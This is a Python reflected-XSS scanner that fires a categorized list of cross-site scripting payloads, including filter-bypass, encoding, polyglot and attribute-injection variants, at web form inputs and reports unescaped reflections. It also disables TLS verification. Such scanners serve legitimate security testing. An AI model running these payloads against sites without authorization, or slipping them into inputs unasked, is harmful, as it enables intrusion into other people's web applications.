import re
import requests
from urllib.parse import urlparse

_EVENT_HANDLER_RE = re.compile(r'on\w+=alert\(', re.IGNORECASE)

def run_xss_scan(forms):
    XSS_PAYLOADS = {
        "basic": [
            "<script>alert(1)</script>",
            "<script>alert('XSS')</script>",
            "<SCRIPT>alert(1)</SCRIPT>"
        ],
        "event_handler": [
            "<img src=x onerror=alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<svg onload=alert(1)>",
            "<a href=\"#\" onclick=alert(1)>click</a>",
            "<div onmouseover=alert(1)>hover me</div>"
        ],
        "bypass": [
            "<ScRiPt>alert(1)</sCrIpT>",
            "<IMG SRC=x OnErRoR=alert(1)>",
            "<svg/onload=alert(1)>",
            "< script >alert(1)</ script >"
        ],
        "encoding": [
            "<img src=x onerror=alert`1`>",
            "<img src=x onerror=alert(String.fromCharCode(49))>",
            "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
            "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
            "<img src=x onerror=\"\\u0061lert(1)\">"
        ],
        "javascript_uri": [
            "<a href=\"javascript:alert(1)\">click</a>",
            "<a href=\"javascript:void(alert(1))\">click</a>",
            "<iframe src=\"javascript:alert(1)\"></iframe>",
            "<form action=\"javascript:alert(1)\"><input type=submit></form>"
        ],
        "html5": [
            "<video><source onerror=alert(1)></video>",
            "<audio src=x onerror=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>test</marquee>",
            "<meter value=2 min=0 max=10 onmouseover=alert(1)>"
        ],
        "nested": [
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "<img src=\"x\" onerr\\x00or=alert(1)>",
            "<img/src/onerror=alert(1)>",
            "<<script>alert(1)//<</script>"
        ],
        "css": [
            "<div style=\"background:url(javascript:alert(1))\">",
            "<style>body{background:url(javascript:alert(1))}</style>",
            "<link rel=\"stylesheet\" href=\"javascript:alert(1)\">"
        ],
        "polyglot": [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('xss') )//%0D%0A%0d%0a//</style></title></textarea></script>--><p",
            "'\">><marquee><img src=x onerror=confirm(1)></marquee>\"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)>"
        ],
        "attr_injection": [
            "\" onmouseover=alert(1) ",
            "' onfocus=alert('1') autofocus ",
            "\" onpointerover=alert(1) ",
            "' onclick=alert(1) ",
        ]
    }
    
    # Flatten payloads into a simple list for scanning
    payloads = []
    for category, p_list in XSS_PAYLOADS.items():
        payloads.extend(p_list)
    
    results = []
    
    for form in forms:
        action = form.get("action_url")
        method = form.get("method", "get").lower()
        inputs = form.get("inputs", [])
        
        if not action or not inputs:
            continue
            
        for payload in payloads:
            data = {}
            test_param = None
            
            # Fill inputs: use payload for one text input, dummy data for others
            for inp in inputs:
                if inp["type"] in ["text", "search", "url", "email", "password"]:
                    if not test_param:
                        data[inp["name"]] = payload
                        test_param = inp["name"]
                    else:
                        data[inp["name"]] = "test"
                else:
                    data[inp["name"]] = "1"
                    
            if not test_param:
                break # No suitable input field found in this form
                
            try:
                if method == "post":
                    res = requests.post(action, data=data, timeout=5, verify=False)
                else:
                    res = requests.get(action, params=data, timeout=5, verify=False)
                    
                # Check if payload is reflected unescaped
                from urllib.parse import unquote
                decoded_payload = unquote(payload)
                
                # To avoid false positives on safe forms, we only consider reflection as XSS if:
                # 1. The payload contains HTML special chars and survived unescaped
                # 2. Or the payload was URL-encoded, decoded by the server, and reflected unescaped
                
                is_vuln = False
                escapable_chars = ['<', '>', '"', "'", '&']

                if payload in res.text and any(c in payload for c in escapable_chars):
                    is_vuln = True
                elif payload != decoded_payload and decoded_payload in res.text and any(c in decoded_payload for c in escapable_chars):
                    is_vuln = True
                elif _EVENT_HANDLER_RE.search(payload) and payload in res.text:
                    # Attribute-injection: no < or > needed, event handler reflected unescaped
                    is_vuln = True
                    
                if is_vuln:
                    results.append({
                        "url": action,
                        "parameter": test_param,
                        "payload": payload,
                        "vulnerable": True
                    })
                    break # Stop testing payloads if one succeeds for this form
                    
            except Exception:
                pass
                
    return results
